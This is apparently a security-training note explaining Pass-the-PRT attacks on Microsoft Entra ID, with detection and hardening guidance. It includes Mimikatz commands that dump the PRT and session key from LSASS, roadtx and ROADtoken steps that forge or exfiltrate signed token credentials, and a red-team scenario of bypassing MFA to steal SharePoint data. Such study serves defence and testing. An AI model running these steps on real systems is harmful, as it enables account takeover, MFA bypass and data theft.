---
tags: [active-directory, azure, hybrid, exchange, vapt]
difficulty: expert
module: "65 - Hybrid Identity, Entra ID, and Exchange Attacks"
topic: "65.02 Pass-the-PRT Primary Refresh Token Attacks"
---

# 65.02 - Pass-the-PRT Primary Refresh Token Attacks

## Executive Summary
In modern Microsoft Entra ID (formerly Azure AD) environments, traditional credential harvesting techniques (like Pass-the-Hash) are increasingly ineffective for accessing cloud resources due to multi-factor authentication (MFA) and Conditional Access policies. The **Primary Refresh Token (PRT)** is the linchpin of Seamless Single Sign-On (SSSO) in Windows 10/11 devices joined to Entra ID. A PRT is a highly privileged artifact that not only proves the user's identity but also attests to the device's state (and often, that MFA was completed). 

A **Pass-the-PRT** attack involves an attacker extracting or interacting with the PRT to request valid Access Tokens for cloud applications (like Microsoft Graph or Outlook Web Access) without knowing the user's plaintext password or possessing their MFA device. This note details the architectural mechanics of the PRT, extraction techniques via `Mimikatz`, interacting with `CloudAP` to bypass TPM protections, and detection engineering.

---

## Primary Refresh Token (PRT) Architecture and Mechanics

### What is a PRT?
A PRT is an opaque JSON Web Token (JWT) issued by Entra ID to Entra Registered, Entra Joined, or Hybrid Entra Joined devices. It serves the same conceptual purpose in the cloud as a Ticket Granting Ticket (TGT) does in on-premises Kerberos. 

When a user logs into a Windows endpoint using their Entra ID credentials, the **CloudAP** (Cloud Authentication Provider) plugin in the Local Security Authority Subsystem Service (LSASS) communicates with Entra ID to obtain the PRT. 

### Key Characteristics of the PRT
1. **Device Binding:** The PRT is cryptographically bound to the specific device. It is tied to a symmetric session key (`SessionKey`).
2. **MFA Claim:** If the user performed MFA during the initial logon (e.g., via Windows Hello for Business), the PRT contains an MFA claim. Subsequent Access Tokens requested using this PRT will satisfy Entra ID Conditional Access MFA requirements.
3. **Renewal:** A PRT is valid for 14 days and is continuously renewed by the OS as long as the device is active.

### PRT Cryptography and TPM Protection
To prevent simple token theft, Microsoft protects the PRT using cryptography tied to the device.
- **Session Key (`SessionKey`):** Issued by Entra ID alongside the PRT. This key is used to sign requests for new Access Tokens.
- **TPM (Trusted Platform Module):** If the device has a TPM, the `SessionKey` is securely isolated inside the TPM. LSASS cannot export the raw `SessionKey`; it can only ask the TPM to sign data using the key.
- If no TPM is present, the `SessionKey` is encrypted using DPAPI (Data Protection API) and stored in memory by LSASS.

---

## Architectural Visualization: PRT Generation and Usage

```text
+---------------------------------------------------------------------------------+
|                               MICROSOFT ENTRA ID                                |
|                                                                                 |
|   +--------------------------+               +------------------------------+   |
|   |                          |               |                              |   |
|   |  Device Registration     |               |  Token Issuance Endpoint     |   |
|   |  (Device Certificate)    |               |  (login.microsoftonline.com) |   |
|   |                          |               |                              |   |
|   +-----------+--------------+               +---------------+--------------+   |
|               ^                                              ^                  |
|               | 1. Device Auth                               | 2. PRT & Tokens  |
+---------------|----------------------------------------------|------------------+
                |                                              |
                v                                              v
+---------------------------------------------------------------------------------+
|                       WINDOWS 10/11 ENDPOINT (ENTRA JOINED)                     |
|                                                                                 |
|   +-------------------------------------------------------------------------+   |
|   |                                LSASS.EXE                                |   |
|   |                                                                         |   |
|   |  +------------------------+             +----------------------------+  |   |
|   |  |     CloudAP Plugin     |             |         DPAPI / CNG        |  |   |
|   |  |                        |             |                            |  |   |
|   |  | Stores PRT in memory   |<----------->| If TPM exists: Key in TPM  |  |   |
|   |  | Uses PRT to request    |             | If no TPM: DPAPI protected |  |   |
|   |  | scoped Access Tokens   |             |                            |  |   |
|   |  +----------+-------------+             +----------------------------+  |   |
|   +-------------|-----------------------------------------------------------+   |
|                 | 3. App needs token (e.g., MS Teams)                           |
|                 v                                                               |
|   +-------------------------------------------------------------------------+   |
|   |                       Browser / Desktop Application                     |   |
|   |                                                                         |   |
|   | Sends signed JWT (using SessionKey) + PRT to Azure AD for Access Token. |   |
|   | Includes header: x-ms-RefreshTokenCredential                            |   |
|   +-------------------------------------------------------------------------+   |
+---------------------------------------------------------------------------------+
```

---

## Vulnerability and Exploitation Mechanisms

Attacking the PRT primarily revolves around the fact that while the PRT itself is opaque, the attacker needs *both* the PRT and the derived `SessionKey` (or the ability to sign requests with it) to forge the `x-ms-RefreshTokenCredential` header and request Access Tokens.

There are two primary exploitation paths depending on the endpoint's configuration (specifically, the presence of a TPM).

### Scenario 1: No TPM (Full Extraction)

If the endpoint lacks a TPM or if software-backed keys were used, the `SessionKey` resides in LSASS memory protected only by DPAPI. An attacker with local Administrator or SYSTEM privileges can extract the PRT, the `SessionKey`, and the context to completely recreate the token off-host.

#### Step 1: Extract PRT using Mimikatz
```powershell
# Run mimikatz as Administrator
privilege::debug
token::elevate
# Extract the CloudAP cache which contains the PRT and DPAPI-protected SessionKey
dpapi::cloudap
```

Output will display the `KeyValue` (the decrypted SessionKey) and the PRT. 
*Example Snippet:*
```text
[00] PRT    : eyJ0eXAiOiJKV1QiLCJhb... (Base64 JWT)
[00] Key    : 4b1c2a9d... (Cleartext Session Key)
```

#### Step 2: Forging the PRT Cookie using ROADtools / AADInternals
Once extracted, the attacker can use external tools like `ROADtools` (`roadtx`) to generate a valid browser cookie using the PRT and the Session Key.

```bash
# Using roadtx to generate a PRT cookie
roadtx prt -r "eyJ0eXAiOiJKV1QiLCJhb..." -k "4b1c2a9d..." 
```

The output provides an `x-ms-RefreshTokenCredential` JWT. The attacker injects this into a browser using an extension (like EditThisCookie) on `login.microsoftonline.com`, instantly gaining authenticated access to the user's Entra ID session (MFA satisfied).

---

### Scenario 2: TPM-Protected PRT (Interacting with CloudAP)

If a TPM is present, the `SessionKey` cannot be extracted from memory. However, the attacker doesn't need to extract the key if they control the endpoint. They can simply ask LSASS (and the CloudAP plugin) to sign the token request *for* them.

#### Step 1: Requesting a Signed Token via COM/RPC
Security researcher Dirk-jan Mollema developed `ROADtoken` and features in `AADInternals` that interact directly with the Windows API to request a signed nonce from CloudAP.

```powershell
# Using ROADtoken on the compromised host (running in the context of the user)
.\ROADtoken.exe
```

*How it works under the hood:*
1. The tool requests a nonce from Entra ID.
2. It sends the nonce to the local COM interface for the CloudAP plugin.
3. CloudAP passes the nonce to the TPM.
4. The TPM signs the nonce using the hardware-protected `SessionKey`.
5. CloudAP returns the fully signed `x-ms-RefreshTokenCredential` string back to the tool.

#### Step 2: Exfiltrating and Abusing the Signed Token
The attacker takes the signed token (which is typically valid for 10-15 minutes) and uses it from their attacker machine to request an Access Token for any service (like MS Graph or Outlook).

```bash
# Exfiltrate the generated cookie and use it to get an Access Token for MS Graph
roadtx browserprtauth -c <exfiltrated_cookie> -url "https://graph.microsoft.com"
```

---

## Detailed Payload Structure: x-ms-RefreshTokenCredential

Understanding what is actually sent to Entra ID is crucial for debugging and detection. The `x-ms-RefreshTokenCredential` is a JWT containing:
1. **Header:** Contains the device's public key thumbprint and algorithm (e.g., RS256).
2. **Payload:** Contains the `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer`, the `request_nonce`, and the base64-encoded PRT itself.
3. **Signature:** This is the critical part. The entire JWT is signed by the `SessionKey`. This proves possession of the device key.

*Example Header in an HTTP Request:*
```http
POST /common/oauth2/v2.0/token HTTP/1.1
Host: login.microsoftonline.com
Content-Type: application/x-www-form-urlencoded

grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer
&assertion=<Signed_PRT_JWT>
&client_id=1b730954-1685-4b74-9bfd-dac224a7b894
&scope=https://graph.microsoft.com/.default
```

---

## Detection Engineering and Indicators of Compromise (IoCs)

Detecting Pass-the-PRT attacks is notoriously difficult because the resulting token requests appear to come from a valid user possessing a valid device token. However, several telemetry sources provide visibility:

1. **Endpoint Detection (EDR / Sysmon):**
   - **Process Access:** Monitor for unauthorized processes (like `mimikatz.exe` or suspicious PowerShell) requesting `PROCESS_VM_READ` (0x0010) or `PROCESS_ALL_ACCESS` (0x1fffff) against `lsass.exe`. (Sysmon Event ID 10).
   - **COM Object Instantiation:** Monitor for unusual processes interacting with the CloudAP COM interfaces used by `ROADtoken` (e.g., `BrowserCore.exe` anomalous spawning or direct API calls to `IProofOfPossessionCookieInfoManager`).

2. **Entra ID / Azure AD Sign-in Logs:**
   - **Anomalous IP/Location with Valid Device ID:** If an attacker extracts the PRT (Scenario 1) and uses it from a non-corporate IP address, the Entra ID Sign-In logs will show a successful login with a *known Device ID* but an *anomalous IP*.
   - **User Agent Anomalies:** Token requests using custom python scripts (like `roadtx`) may leave anomalous `User-Agent` strings unless specifically spoofed by the attacker.

3. **Microsoft Defender for Identity (MDI) / Defender for Endpoint (MDE):**
   - MDE includes specific behavioral detections for "Possible Pass-the-PRT attack" based on memory access patterns to the CloudAP authentication package.

---

## Hardening and Remediation Strategies

1. **Hardware Root of Trust (TPM 2.0):** Mandate TPM 2.0 on all endpoints. While it does not prevent a local attacker from interacting with CloudAP, it completely prevents offline extraction of the `SessionKey`, severely limiting the attacker's operational window.
2. **Credential Guard:** Enable Windows Defender Credential Guard (using Virtualization-Based Security / VBS). This isolates the LSASS process in a virtualized container, blocking `mimikatz` from reading the memory containing DPAPI keys or the CloudAP cache.
3. **Conditional Access Policies:** 
   - Implement **Compliant Device** requirements.
   - Enforce **Continuous Access Evaluation (CAE)**. CAE allows Entra ID to instantly revoke Access Tokens if a critical event occurs (e.g., user password change, disabled account, or detected high risk).
4. **Endpoint Privilege Management (EPM):** Pass-the-PRT fundamentally requires local Administrator or SYSTEM rights. Removing local admin access from end-users drastically reduces the likelihood of this attack.

---


## Real-World Attack Scenario
## Real-World Attack Scenario: Pass-the-PRT for Cloud Pivot

**The Context:** A red team is engaged in an objective-based assessment where the goal is to access sensitive financial data stored in a heavily restricted SharePoint Online site. The target organization utilizes Entra ID with strict Conditional Access (CA) policies: access to SharePoint is only permitted from Hybrid Entra Joined, "Compliant" devices, and requires Phishing-Resistant MFA via Windows Hello for Business. The red team has already achieved local Administrator privileges on a developer's Windows 11 laptop, but they do not have the user's PIN or biometric data to perform a new interactive login, nor do they know the plaintext password.

**The Reconnaissance:** 
The attacker enumerates the endpoint and confirms it is Hybrid Entra Joined and equipped with a TPM 2.0 module. Because of the TPM, the cryptographic `SessionKey` protecting the user's Primary Refresh Token (PRT) cannot be extracted from LSASS memory or decrypted offline. However, the attacker knows that the `CloudAP` plugin must still perform cryptographic signing operations on behalf of the user to request new Access Tokens for cloud applications.

**The Execution:**
1. **In-Memory Interaction:** Instead of attempting to dump LSASS and extract the PRT (which would fail due to the TPM), the attacker uploads a custom C# utility based on `ROADtoken` to the compromised endpoint.
2. **Requesting the Nonce:** From their external attack infrastructure, the attacker initiates an OAuth 2.0 device authorization flow against Entra ID, requesting access to Microsoft Graph and SharePoint Online. Entra ID responds with a cryptographic nonce.
3. **Hardware-Backed Signing:** The attacker feeds this nonce into the `ROADtoken` utility running on the developer's laptop. The utility interacts with the local COM interface of the `CloudAP` plugin. `CloudAP` unknowingly sends the nonce to the TPM, which signs it using the hardware-protected `SessionKey`.
4. **Token Exfiltration:** The utility outputs a fully signed JSON Web Token (JWT) string, representing a valid `x-ms-RefreshTokenCredential` header. The attacker quickly exfiltrates this signed string back to their infrastructure.
5. **Session Hijacking:** Using a specialized tool like `roadtx`, the attacker crafts an HTTP POST request to `login.microsoftonline.com`, injecting the exfiltrated, signed JWT. 

**The Outcome:**
Entra ID validates the signature against the device's public key. Because the PRT was originally obtained via Windows Hello for Business (MFA) and the signature proves possession of the compliant device, all Conditional Access requirements are instantly satisfied. Entra ID issues valid Access and Refresh tokens directly to the attacker's machine. The attacker uses these tokens to authenticate to SharePoint Online via the REST API, bypassing all CA and MFA controls, and successfully exfiltrates the targeted financial documents without ever triggering a new MFA prompt on the victim's device.

## Chaining Opportunities
- A Pass-the-PRT attack is often the final phase of a client-side compromise. If an attacker compromises an endpoint via Phishing, they will escalate privileges and execute Pass-the-PRT.
- The resulting access to Entra ID (satisfying MFA and Device compliance claims) can be used to pivot into cloud infrastructure, modify Conditional Access policies, or access sensitive SharePoint/OneDrive data.
- Read [[01 - Entra ID vs On-Prem AD Architecture]] for foundational context on how PRTs fit into the hybrid ecosystem.

## Related Notes
- [[01 - Entra ID vs On-Prem AD Architecture]]
- [[04 - Seamless SSO Desktop SSO Abuse]]
- [[Microsoft Entra ID OAuth2 Abuse]]
- [[Bypassing Multi-Factor Authentication]]

---
*End of note.*
